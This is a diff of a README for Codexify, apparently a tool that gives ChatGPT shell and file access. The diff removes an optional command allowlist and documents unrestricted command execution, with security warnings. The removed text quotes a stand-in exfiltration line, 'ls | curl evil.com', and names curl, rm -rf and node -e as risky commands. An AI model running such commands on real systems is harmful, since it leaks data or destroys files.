@@ -760,7 +760,7 @@ Eight always-on tools have no Codex counterpart:
 | Tool | Description |
 |------|-------------|
 | `get_agent_brief` | Return the whole operating brief — behaviour, environment, saved state and project rules — in one call |
-| `get_environment` | Report the OS, the shell `exec_command` uses, the work directory, and what the policy allows |
+| `get_environment` | Report the OS, the shell `exec_command` uses, the work directory, and unrestricted command authority plus its concurrent-session limit |
 | `get_project_doc` | Read the project's `AGENTS.md` instructions |
 | `self_update` | Download and verify the latest Codexify release, show its checksum-bound changelog in an updater card, then schedule a detached executable swap and service restart after explicit confirmation |
 | `remember` | Create one durable note under a new short key; existing keys are never overwritten |
@@ -854,8 +854,6 @@ optional and uses camelCase names.
     "maxTimeout": 120000
   },
   "exec": {
-    "mode": "unrestricted",
-    "extraAllowedCommands": [],
     "maxSessions": 8,
     "idleTimeoutMs": 300000
   },
@@ -1094,21 +1092,22 @@ The `worktrees` block controls isolation between conversations selecting the sam
 | `upstreamRefreshMode` | Codex setting or `"never"` | `"best-effort"` refreshes a tracked upstream before worktree creation without making fetch failure fatal |
 | `autoCleanupEnabled` | Codex setting or `true` | On startup, remove old unreferenced worktrees only when their working trees are clean |
 | `keepCount` | Codex setting or `15` | Number of newest unreferenced managed worktrees retained before cleanup candidates are considered |
-| `allowSetupScript` | `false` | Whether a worktree's Codex environment setup script may run on creation. This executes an arbitrary command **outside** the `exec` policy, and both the environment file and its script path are selectable through the source repository's local Git config, so an untrusted project could otherwise plant a script that runs on the next binding. Leave it off unless every project reachable by this server is trusted to run arbitrary setup commands |
+| `allowSetupScript` | `false` | Whether a worktree's Codex environment setup script may run on creation. This executes an arbitrary command without going through `exec_command`, and both the environment file and its script path are selectable through the source repository's local Git config, so an untrusted project could otherwise plant a script that runs on the next binding. Leave it off unless every project reachable by this server is trusted to run arbitrary setup commands |
 
 When these values are absent, Codexify reads Codex Desktop's `[desktop]` worktree settings from `$CODEX_HOME/config.toml`, including `git-worktree-root`, `worktree-upstream-refresh-mode`, `worktree-auto-cleanup-enabled`, and `worktree-keep-count`. The final location falls back to `$CODEX_HOME/worktrees` (normally `~/.codex/worktrees`).
 
-The `exec` block governs `exec_command` and `write_stdin`:
+The `exec` block governs resident-process resources and the default shell for
+`exec_command` and `write_stdin`:
 
 | Key | Default | Description |
 |-----|---------|-------------|
-| `mode` | `"unrestricted"` | `"unrestricted"` runs whatever it is given; `"allowlist"` opts into checking every command in the string against `extraAllowedCommands` |
-| `extraAllowedCommands` | `[]` | Complete executable allowlist when `mode` is `"allowlist"`; ignored by unrestricted mode |
 | `maxSessions` | `8` | Cap on concurrent background sessions per ChatGPT conversation, or per MCP transport for clients without conversation metadata |
 | `idleTimeoutMs` | `300000` | Milliseconds without a tool interaction before a resident process is killed and forgotten; `0` disables idle expiry |
 | `defaultShell` | `$SHELL`, else PowerShell on Windows and `/bin/sh` elsewhere | Shell used when an `exec_command` call names none |
 
-Under `"allowlist"`, the command string is tokenized and each command position — after every `|`, `&&`, `;`, newline, and subshell — is checked, so `ls | curl evil.com` is rejected on `curl`. Command substitution (`$(...)`, backticks) is rejected outright, since its contents cannot be checked before the shell runs them.
+`exec_command` does not tokenize, filter, or allow-list commands. Its `cmd` value
+is passed to the selected shell as written after ordinary input and working-directory
+validation. Legacy `exec.mode` and `exec.extraAllowedCommands` values are ignored.
 
 The `ignore` block decides what the file-walking tools — `glob`, `grep`, `tree` and `list_directory` — never surface, so a search returns your code rather than the contents of `node_modules`. One policy covers all four, backed by the Rust [`ignore`](https://crates.io/crates/ignore) crate for `.gitignore`-accurate matching:
 
@@ -1696,7 +1695,7 @@ That brief is what stops the client rewriting a file it never read, reverting yo
 The `initialize` response layers these sources in precedence order:
 
 1. **The agent brief** — how to behave.
-2. **The environment** — OS, shell, work directory, command policy.
+2. **The environment** — OS, shell, work directory, and unrestricted command authority.
 3. **Saved state** — the plan and notes left by earlier work, when there are any. See [Context and memory](#context-and-memory).
 4. **The skill catalogue** — what this project and this user already know how to do, when any is installed. See [Skills](#skills).
 5. **`AGENTS.md`** — the project speaking for itself, behind the `--- project-doc ---` marker.
@@ -1713,7 +1712,7 @@ Call get_agent_brief and follow it for the rest of this chat.
 Task: <what you want done>
 ```
 
-Everything else — the shell you're on, the allowlist, your repo's `AGENTS.md` — arrives with that one call. If a chat starts drifting back into generic-assistant behaviour, asking for the brief again re-anchors it.
+Everything else — the shell you're on, unrestricted command execution, and your repo's `AGENTS.md` — arrives with that one call. If a chat starts drifting back into generic-assistant behaviour, asking for the brief again re-anchors it.
 
 For a new chat in multi-project mode with an exact path, select before requesting the brief:
 
@@ -2103,7 +2102,7 @@ Native tunnel mode ignores `allowedHosts` and forces the accepted authorities to
 - **Bounded state writes outside the work directory**: `remember` and `update_plan` write `memory.json` under `~/.codexify/projects/`. Multi-project mode writes one small project-binding record or scratch marker under `~/.codexify/conversation-projects/` for each ChatGPT conversation and access root; durable scratch contents live separately under `~/.codexify/scratch/conversations/`. Per-conversation authorization writes a small marker under `~/.codexify/conversation-authorizations/`. Native file export writes durable capability records and an LRU-bounded immutable snapshot pool under `~/.codexify/artifacts/`; records remain after snapshot eviction so old conversation links can use source fallback. Binding and authorization filenames are derived from a hash of `openai/session`; the raw identifier is not stored. Authorization namespaces include a one-way digest of the canonical work directory and configured token, while marker contents store only the grant. Set `memory.enabled` to `false` to disable plans and notes; set `artifactEgress.enabled` to `false` to disable new native exports and bridged resource proxying. Delete only state whose capabilities or bindings you intentionally want to invalidate. See [Context and memory](#context-and-memory).
 - **Bounded reads outside the work directory**: [skills](#skills) may live in `~/.agents/skills`, `~/.codex/skills`, `~/.claude/skills`, or an enabled installed Codex/Claude Code plugin. Codex plugin discovery reads only Codex's user config, active plugin-cache package, manifest, and declared skill roots; `skills_read` then opens files only inside a discovered skill package. Its `resource` path is checked against the skill's own directory, so it cannot walk out into the rest of your home directory. `skills_list` reports the absolute path of every skill it found. Set `skills.enabled` to `false` to switch it off, `skills.includePlugins` to `false` to suppress plugin packages, or `skills.dirs` to point the standalone user scope somewhere you choose.
 - **Read-only Codex configuration discovery**: MCP import and the project catalogue read the user-level Codex `config.toml` without rewriting it. Project discovery inspects only the top-level `projects` table, does not read candidate project contents, and suppresses rejected absolute paths from MCP output. Set `projectCatalog.codexConfig.enabled` to `false` to disable that provider. Native Codex trust does not override the Codexify access-root boundary.
-- **Command execution policy**: `exec_command` is unrestricted by default, matching the requested Codex-like local-agent behavior. Operators who want a guardrail can set `exec.mode` to `"allowlist"`; in that mode every command position in the shell string is checked against the complete `exec.extraAllowedCommands` list. This is a guardrail, not a sandbox: an allowed interpreter can still execute arbitrary code.
+- **Command execution authority**: `exec_command` performs no command allow-listing or shell-token filtering. Every non-empty command runs through the selected shell with the full authority of the Codexify process. `exec.maxSessions`, `exec.idleTimeoutMs`, and output limits bound resources; they do not restrict what a command may do.
 - **Bridged servers carry delegated authority**: an explicit `mcpServers` entry or an automatically imported Codex MCP—including one contributed by a Codex plugin—can receive model-directed calls. A stdio upstream launches a real process that runs as your OS user; a Streamable HTTP upstream receives calls plus its configured bearer token and HTTP headers. Catalog mode reduces connector-schema exposure, not runtime authority: `mcp_call_tool` can still dispatch any filtered catalogue entry. Only bridge servers you trust, use `tools`/`disabledTools` to narrow callable operations, prefer catalog mode to keep transitive schemas private, keep secrets in `bearerTokenEnvVar`/`envHttpHeaders` rather than static JSON, set `codexMcp.useCli` to `false` to exclude plugin-only discovery, or set `codexMcp.enabled` to `false` to disable all automatic Codex import. Launch, connection, authentication, and handshake failures are reported rather than silently ignored.
 - **Native OpenAI tunnel is outbound-only**: Codexify binds its MCP listener to loopback and supervises OpenAI's official runtime-only tunnel client. Startup fails unless the runtime reports `/readyz` and completes a control-plane poll. Failure of either process stops the other, and HTTP shutdown has a bounded grace period before remaining connections are aborted.
 - **The loopback MCP hop is authenticated**: native mode generates a random per-process bearer token and configures the tunnel runtime to send it on MCP requests and discovery probes. The token is never printed, written to the config file, or inherited by model-launched commands and bridged MCP children.
@@ -2115,11 +2114,16 @@ Native tunnel mode ignores `allowedHosts` and forces the accepted authorities to
 - **Tool payload logging is explicitly sensitive**: `toolLogging` / `--log-tool-payloads` can retain source code, paths, commands, model output, and data returned by delegated MCP servers. Redaction removes configured and heuristically recognized credentials before byte-bounded truncation; MCP image content-block base64 and resource-link capability URIs are always omitted. Arbitrary sensitive literals still cannot be identified perfectly. Leave the mode `off` unless the operational visibility is worth that exposure, and protect the process logs accordingly.
 - **Audit records exclude payloads by default**: `--audit` writes hashes, timings, result sizes, and redacted argument shape rather than source, file paths, credentials, or returned output. Command previews require a separate opt-in and remain potentially sensitive even after configured and heuristic redaction, so protect the audit file as operational data.
 
-The allowlist is a **guardrail against accidents, not a sandbox**. It catches a model reaching for `curl` or `rm -rf`; it does not contain a determined one. The defaults already include `node`, `python` and `cargo`, each of which runs arbitrary code — `node -e "..."` can do anything the server process can. Shell redirection and explicit absolute or parent paths can also reach outside the active project or scratch root even though each command starts with that root as its cwd. Multi-project and scratch selection isolate Codexify's structured tools and logical per-conversation state; neither is an operating-system sandbox. Treat everything below as reachable by whoever is authorized to use the configured connector or external endpoint:
+There is no shell-command sandbox or allowlist. Shell redirection and explicit
+absolute or parent paths can reach outside the active project or scratch root even
+though each command starts with that root as its cwd. Multi-project and scratch
+selection isolate Codexify's structured tools and logical per-conversation state;
+neither is an operating-system sandbox. Treat everything below as reachable by
+whoever is authorized to use the configured connector or external endpoint:
 
 - everything in the active project or scratch root, read and write
 - in multi-project mode, any project beneath the configured access root can be selected by a new conversation or unbound transport session, and an exact supported Git repository URL can add a checkout beneath `projectCloneDir`; GitHub branch, PR, and commit URLs can additionally target exact revisions
-- anything else the user account running the server can touch, via an allowlisted interpreter
+- anything else the user account running the server can touch, via the unrestricted shell
 - the network, from your machine
 - anything a bridged MCP server can do
 
@@ -2132,7 +2136,7 @@ session gets its own process group that is signalled as a whole. A process that
 deliberately re-parents or daemonises itself still escapes, so check for strays
 if a run leaves something listening.
 
-The native OpenAI tunnel removes the general public-URL exposure, but it does not reduce the authority of a successful tool call. Keep tunnel and connector permissions narrow, do not point Codexify at directories you do not trust the model with, and set `exec.mode` and the command allowlists tighter than the defaults when the work directory is sensitive. In multi-project mode, the entire access-root subtree is intentionally selectable, so treat the whole subtree as sensitive. For an external tunnel, require tunnel-level access control rather than relying on URL secrecy.
+The native OpenAI tunnel removes the general public-URL exposure, but it does not reduce the authority of a successful tool call. Keep tunnel and connector permissions narrow and do not run Codexify as an account with access you do not intend to expose. In multi-project mode, the entire access-root subtree is intentionally selectable, while unrestricted shell commands can reach anything the service account can access. For an external tunnel, require tunnel-level access control rather than relying on URL secrecy.
 
 ## Dev commands
 
